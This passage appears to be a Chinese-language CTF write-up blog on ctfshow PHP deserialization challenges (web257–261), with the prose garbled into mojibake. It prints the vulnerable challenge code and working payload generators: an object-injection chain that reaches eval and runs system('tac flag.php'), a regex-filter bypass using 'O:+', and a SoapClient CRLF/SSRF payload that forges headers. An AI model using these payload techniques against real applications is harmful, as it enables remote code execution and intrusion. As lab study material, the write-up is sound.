class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªé¢˜ç¬¬ä¸€æ¬¡é‡åˆ°äº†é­”æœ¯æ–¹æ³•ï¼Œ ç”±äºå­˜åœ¨ backDoor ç±»ï¼Œé‡Œé¢æœ‰å¯ä»¥è¿›è¡Œ RCE çš„ç‚¹ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œå¯ä»¥æƒ³åŠæ³•è§¦å‘ <code>__construct</code>  æ–¹æ³•ä»¥åŠä¿®æ”¹å‚æ•°æ¥åˆ›å»ºè¿™ä¸ªç±»ï¼Œä½†æ˜¯ï¼Œç”±äº info ç±»å’Œ backDoor ç±»éƒ½æœ‰ä¸€ä¸ªåŒåçš„æ–¹æ³•ï¼Œå°±æ˜¯ getInfoï¼Œæ‰€ä»¥åœ¨è„šæœ¬ç»“æŸçš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯é‡Šæ”¾æˆ–è€…é”€æ¯ç±»çš„æ—¶å€™å°±ä¼šè°ƒç”¨ <code>__destruct</code>  æ–¹æ³•ï¼Œ ç„¶åè°ƒç”¨åˆ° backDoor ç±»é‡Œçš„ getInfo æ–¹æ³•è¿›è¡Œ RCEã€‚ç”Ÿæˆ payload çš„è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web258"><a class="markdownIt-Anchor" href="#web258">#</a> web258ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªé¢˜å¯¹æ¯”ä¸Šä¸€é¢˜ï¼Œå¤šäº†ä¸ªæ­£åˆ™è¿‡æ»¤ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è¿‡æ»¤äº† o: æ•°å­— ä»¥åŠ c: æ•°å­— ï¼Œè¿™ç§å½¢å¼ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨åŠ å·ç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;system(&#x27;tac fl*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:&quot;</span>,<span class="string">&quot;O:+&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªæ„é€ æˆ‘è¸©äº†ä¸å°‘å‘ï¼Œæœ€ä¸¥é‡çš„æ˜¯ system å‡½æ•°åé¢ï¼Œæ²¡æœ‰åŠ åˆ†å·ï¼Œè¿™ä¸ªæ˜¯æœ€å¤§çš„é—®é¢˜ï¼Œæˆ‘ä¸€ç›´ä»¥ä¸ºæ²¡æœ‰æˆåŠŸï¼Œç»“æœæ˜¯å› ä¸ºæ¯å®¶åˆ†å·ã€‚</p><h1 id="web259"><a class="markdownIt-Anchor" href="#web259">#</a> web259ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªé¢˜ç»™çš„ä¿¡æ¯å¥½å°‘ï¼Œä¸ä¼šåšï¼Œçœ‹ä¸‹ wpã€‚</p><p>â€‹è¿™ä¸€é¢˜ä¸»è¦è€ƒå¯Ÿäº†åŸç”Ÿç±»çš„ååºåˆ—åŒ–ï¼Œå¥½å§ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°å®Œå…¨æƒ³ä¸åˆ°ï¼Œå³ä½¿å­¦äº†åŸç”Ÿç±»ä¹Ÿæ²¡æƒ³åˆ°ã€‚</p><p>â€‹ç”±äºæ•´ä¸ª index é‡Œé¢æ²¡æœ‰ä»»ä½•ç±»ï¼Œæ‰€ä»¥åé¢çš„ååºåˆ—åŒ–åŠ ä¸Š $vip-&gt;getFlag (); ç»™äººç¬¬ä¸€ååº”åº”è¯¥æ˜¯è°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ä»¥åŠåŸç”Ÿç±»ç»“åˆï¼Œè§¦å‘ <code>__call</code>  é­”æœ¯æ–¹æ³•ï¼Œ</p><p>â€‹è´´ä¸€ä¸ªé“¾æ¥ï¼Œè¿™ä¸ªæ–‡ç« æ„Ÿè§‰å¾ˆè¯¦ç»†ï¼š<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1cHBpZTAwMS9hcnRpY2xlL2RldGFpbHMvMTM5ODY1NTA1P29wc19yZXF1ZXN0X21pc2M9JTI1N0IlMjUyMnJlcXVlc3QlMjU1RmlkJTI1MjIlMjUzQSUyNTIyOEZGNkI0MEItMkJDMS00MjAxLTg3MTgtMUQyMzE4MUEwRDY0JTI1MjIlMjUyQyUyNTIyc2NtJTI1MjIlMjUzQSUyNTIyMjAxNDA3MTMuMTMwMTAyMzM0Li4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPThGRjZCNDBCLTJCQzEtNDIwMS04NzE4LTFEMjMxODFBMEQ2NCZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfnNvYmFpZHVlbmR+ZGVmYXVsdC0yLTEzOTg2NTUwNS1udWxsLW51bGwuMTQyJTVFdjEwMCU1RXBjX3NlYXJjaF9yZXN1bHRfYmFzZTYmYW1wO3V0bV90ZXJtPVNvYXBDbGllbnQlRTUlOEUlOUYlRTclOTQlOUYlRTclQjElQkImYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3">ã€é¶åœºã€‘ctfshow è¯¦è§£ web259 åŸç”Ÿç±»ååºåˆ—åŒ–</span></p><p>â€‹è¿™é‡Œæ˜¯ä½¿ç”¨çš„ Soapclient åŸç”Ÿç±»ï¼š</p><blockquote><p><strong>Soapclient åŸç”Ÿç±»ä¸»è¦ä½œç”¨æ˜¯ä½¿ PHP åº”ç”¨ç¨‹åºèƒ½å¤Ÿæ–¹ä¾¿åœ°è°ƒç”¨è¿œç¨‹çš„ SOAP æœåŠ¡</strong></p><p><strong>SoapClient åŸç”Ÿç±»ï¼Œç±»ä¼¼äº curl ä¸€æ ·çš„å­˜åœ¨ï¼ŒåŸºäº XML çš„åè®®ï¼Œå®ƒä½¿åº”ç”¨ç¨‹åºé€šè¿‡ HTTP æ¥äº¤æ¢ä¿¡æ¯</strong></p></blockquote><p>â€‹æç¤ºé‡Œç»™äº†è¿™ä¸ªï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line"> </span><br><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œflag,php æ–‡ä»¶ä¼šå¸®æˆ‘ä»¬è·å¾— flag çš„å€¼ï¼Œä½†æ˜¯ï¼Œéœ€è¦æå‰æ£€æµ‹ ipï¼Œä¹Ÿå°±æ˜¯ xff çš„å€¼ã€‚</p><p>â€‹ä»ä»£ç ä¸Šçœ‹ç›´æ¥è®¿é—® flag.php ç»™ X_FORWARDED_FOR èµ‹å€¼ 127.0.0.1 ä¸‰æ¬¡ (127.0.0.1, 127.0.0.1,  127.0.0.1) å°±å¯ä»¥ç»•è¿‡ array_pop (åˆ é™¤æ•°ç»„æœ«å°¾çš„å€¼), åœ¨ä¼ å…¥ token ç­‰äº ctfshow å°±èƒ½å¾—åˆ° flag</p><p>â€‹æ‰€ä»¥ï¼Œæ„é€  payload çš„è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;ceshi\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span> , <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>));</span><br></pre></td></tr></table></figure><p>â€‹å®Œæˆä¸Šé¢çš„ç”Ÿæˆæ“ä½œå¾—å®‰è£… php-soap æ‹“å±•ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯ phpstudyï¼Œå®ƒè‡ªå¸¦è¿™ä¸ªæ‹“å±•ï¼Œä½†æ˜¯æ²¡æœ‰ç¼–è¯‘ã€‚æ‰“å¼€ php-iniï¼Œæ‰¾åˆ° extension=php_soap.dllï¼ŒæŠŠå‰é¢çš„åˆ†å·å»æ‰ã€‚</p><p>â€‹ä¹‹åå¾—åˆ°çš„ payload å‘é€ä¹‹åç›´æ¥è¯»å– flag.txt å³å¯ã€‚</p><h1 id="web260"><a class="markdownIt-Anchor" href="#web260">#</a> web260ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ æ²¡ææ‡‚è¿™ä¸ªé¢˜çš„æ„ä¹‰æ˜¯å•¥ï¼Œç®—äº†æ— è„‘äº†ï¼šget ä¼ ä¸€ä¸ª ctfshow=ctfshow_i_love_36D å³å¯å¾—åˆ° flagã€‚</p><h1 id="web261"><a class="markdownIt-Anchor" href="#web261">#</a> web261ï¼š</h1><p>â€‹æç¤ºé‡Œå‡ºç°äº†ä¸ªæ‰“ redisï¼Œæœ‰ç‚¹å®³æ€•äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span 